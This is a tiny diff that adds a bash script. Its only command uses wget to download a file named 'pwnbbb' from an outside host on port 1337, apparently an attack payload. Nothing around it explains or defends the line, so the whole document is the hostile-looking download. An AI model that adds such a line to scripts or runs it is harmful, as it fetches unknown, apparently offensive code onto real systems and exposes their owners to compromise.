@@ -1,0 +1,2 @@
+#!/bin/bash
+wget http://d90-a.onsec.ru:1337/pwnbbb
